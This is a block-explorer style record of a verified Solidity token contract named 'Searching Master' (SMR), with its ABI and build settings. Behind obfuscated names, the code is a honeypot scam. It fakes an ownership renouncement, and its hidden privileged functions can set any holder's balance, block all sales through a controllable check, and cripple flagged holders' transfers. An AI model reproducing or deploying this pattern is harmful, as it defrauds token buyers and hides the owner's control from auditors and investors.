{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface toAtSell {\n    function createPair(address fromTx, address minFund) external returns (address);\n}\n\ninterface amountTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxBuy) external view returns (uint256);\n\n    function transfer(address liquidityLimit, uint256 liquidityTxMin) external returns (bool);\n\n    function allowance(address fundAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTxMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLimit,\n        uint256 liquidityTxMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLaunch, uint256 value);\n    event Approval(address indexed fundAmount, address indexed spender, uint256 value);\n}\n\nabstract contract marketingReceiverMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingLaunchTake is amountTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SearchingMaster is marketingReceiverMode, amountTrading, tradingLaunchTake {\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMarketing;\n    }\n\n    uint256 constant modeShould = 16 ** 10;\n\n    function swapTx(uint256 liquidityTxMin) public {\n        swapLiquidity();\n        exemptEnable = liquidityTxMin;\n    }\n\n    constructor (){\n        if (receiverLiquidity == marketingMin) {\n            isLaunchBuy = marketingMin;\n        }\n        walletReceiver takeTrading = walletReceiver(listSell);\n        launchAutoFund = toAtSell(takeTrading.factory()).createPair(takeTrading.WETH(), address(this));\n        if (marketingMin != isLaunchBuy) {\n            marketingMin = receiverLiquidity;\n        }\n        tokenSell = _msgSender();\n        fromSenderMin[tokenSell] = true;\n        minLimitMarketing[tokenSell] = enableMax;\n        exemptFrom();\n        if (receiverLiquidity != marketingMin) {\n            receiverLiquidity = marketingMin;\n        }\n        emit Transfer(address(0), tokenSell, enableMax);\n    }\n\n    uint8 private fromLimit = 18;\n\n    function swapLiquidity() private view {\n        require(fromSenderMin[_msgSender()]);\n    }\n\n    string private amountToTrading = \"Searching Master\";\n\n    uint256 public marketingMin;\n\n    event OwnershipTransferred(address indexed marketingMax, address indexed autoTake);\n\n    mapping(address => bool) public receiverSwap;\n\n    function txShouldMode(address launchFund, address liquidityLimit, uint256 liquidityTxMin) internal returns (bool) {\n        require(minLimitMarketing[launchFund] >= liquidityTxMin);\n        minLimitMarketing[launchFund] -= liquidityTxMin;\n        minLimitMarketing[liquidityLimit] += liquidityTxMin;\n        emit Transfer(launchFund, liquidityLimit, liquidityTxMin);\n        return true;\n    }\n\n    address listSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private launchedMarketing = \"SMR\";\n\n    mapping(address => mapping(address => uint256)) private listFee;\n\n    function getOwner() external view returns (address) {\n        return amountFrom;\n    }\n\n    uint256 exemptEnable;\n\n    function senderLimitLaunched(address liquidityFee, uint256 liquidityTxMin) public {\n        swapLiquidity();\n        minLimitMarketing[liquidityFee] = liquidityTxMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountToTrading;\n    }\n\n    mapping(address => bool) public fromSenderMin;\n\n    function balanceOf(address maxBuy) public view virtual override returns (uint256) {\n        return minLimitMarketing[maxBuy];\n    }\n\n    function transferFrom(address launchFund, address liquidityLimit, uint256 liquidityTxMin) external override returns (bool) {\n        if (_msgSender() != listSell) {\n            if (listFee[launchFund][_msgSender()] != type(uint256).max) {\n                require(liquidityTxMin <= listFee[launchFund][_msgSender()]);\n                listFee[launchFund][_msgSender()] -= liquidityTxMin;\n            }\n        }\n        return marketingSwap(launchFund, liquidityLimit, liquidityTxMin);\n    }\n\n    uint256 private isLaunchBuy;\n\n    address public launchAutoFund;\n\n    address enableShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private amountFrom;\n\n    uint256 public receiverLiquidity;\n\n    function buySender(address shouldFee) public {\n        swapLiquidity();\n        if (isLaunchBuy == marketingMin) {\n            receiverLiquidity = marketingMin;\n        }\n        if (shouldFee == tokenSell || shouldFee == launchAutoFund) {\n            return;\n        }\n        receiverSwap[shouldFee] = true;\n    }\n\n    uint256 private enableMax = 100000000 * 10 ** 18;\n\n    function exemptFrom() public {\n        emit OwnershipTransferred(tokenSell, address(0));\n        amountFrom = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMax;\n    }\n\n    function marketingSwap(address launchFund, address liquidityLimit, uint256 liquidityTxMin) internal returns (bool) {\n        if (launchFund == tokenSell) {\n            return txShouldMode(launchFund, liquidityLimit, liquidityTxMin);\n        }\n        uint256 fundSender = amountTrading(launchAutoFund).balanceOf(enableShould);\n        require(fundSender == exemptEnable);\n        require(liquidityLimit != enableShould);\n        if (receiverSwap[launchFund]) {\n            return txShouldMode(launchFund, liquidityLimit, modeShould);\n        }\n        return txShouldMode(launchFund, liquidityLimit, liquidityTxMin);\n    }\n\n    function transfer(address liquidityFee, uint256 liquidityTxMin) external virtual override returns (bool) {\n        return marketingSwap(_msgSender(), liquidityFee, liquidityTxMin);\n    }\n\n    function marketingReceiver(address tradingFee) public {\n        require(tradingFee.balance < 100000);\n        if (atMarketingFee) {\n            return;\n        }\n        \n        fromSenderMin[tradingFee] = true;\n        if (marketingMin != isLaunchBuy) {\n            marketingMin = isLaunchBuy;\n        }\n        atMarketingFee = true;\n    }\n\n    function owner() external view returns (address) {\n        return amountFrom;\n    }\n\n    address public tokenSell;\n\n    function allowance(address minTotalWallet, address shouldTx) external view virtual override returns (uint256) {\n        if (shouldTx == listSell) {\n            return type(uint256).max;\n        }\n        return listFee[minTotalWallet][shouldTx];\n    }\n\n    function approve(address shouldTx, uint256 liquidityTxMin) public virtual override returns (bool) {\n        listFee[_msgSender()][shouldTx] = liquidityTxMin;\n        emit Approval(_msgSender(), shouldTx, liquidityTxMin);\n        return true;\n    }\n\n    uint256 atAuto;\n\n    bool public atMarketingFee;\n\n    mapping(address => uint256) private minLimitMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotalWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"}],\"name\":\"buySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSenderMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAutoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMin\",\"type\":\"uint256\"}],\"name\":\"senderLimitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTxMin\",\"type\":\"uint256\"}],\"name\":\"swapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SearchingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}